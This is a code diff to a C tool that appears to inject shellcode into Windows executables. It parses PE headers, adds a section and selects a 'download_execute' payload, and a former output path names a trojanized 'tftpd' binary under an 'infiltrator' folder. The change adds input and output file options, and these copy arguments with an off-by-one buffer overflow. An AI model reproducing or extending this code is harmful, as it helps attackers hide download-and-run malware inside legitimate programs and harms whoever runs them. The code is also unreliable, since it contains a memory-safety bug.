@@ -141,7 +141,7 @@ int main(int argc, char *argv[])
 	IMAGE_DOS_HEADER idh ;
 	IMAGE_NT_HEADERS inth ;
 	IMAGE_SECTION_HEADER ish[ max_sections ] = {0} ;
-	char *buffer,*newbuffer; 
+	char *buffer,*newbuffer,*outputfile,*inputfile; 
 	unsigned int i,size, offset, offset2, x, end_size, y, count, shellcode_size ;
 	IMAGE_SECTION_HEADER *new_ish;
 	char *shellcode;
@@ -218,12 +218,23 @@ for (count = 0; count < argc; count++)
 			shellcode_size = sizeof(download_execute);
 		}
 	}
+	if (!strcmp(argv[count],"-o"))
+	{
+		outputfile=(char *)calloc(strlen(argv[count+1]),1);
+		strcpy(outputfile,argv[count+1]);
+	}
+	if (!strcmp(argv[count],"-i"))
+	{
+		inputfile=(char *)calloc(strlen(argv[count+1]),1);
+		strcpy(inputfile,argv[count+1]);
+	}
+
 }
 
 	new_ish = (IMAGE_SECTION_HEADER *)calloc(sizeof(IMAGE_SECTION_HEADER),1);
 
 
-	if (! (fp = fopen(argv[1],"rb+"))) //opens file arg 1 , and read it in binary FILE * fopen ( const char * filename, const char * mode );
+	if (! (fp = fopen(inputfile,"rb+"))) //opens file arg 1 , and read it in binary FILE * fopen ( const char * filename, const char * mode );
 	{
 		printf("Couldn't open file\n");
 		return -1;
@@ -381,7 +392,7 @@ for (count = 0; count < argc; count++)
 
 	// size_t fwrite ( const void * ptr, size_t size, size_t count, FILE * stream ); 
 	// write the data pointed to by addr , data size, data count, file stream
-	if(! (fp2 = fopen("G:\\infiltrator\\tftpd-DE-03.exe","wb+")))
+	if(! (fp2 = fopen(outputfile,"wb+")))
 	{
 		printf("Couldn't Open file");
 	}
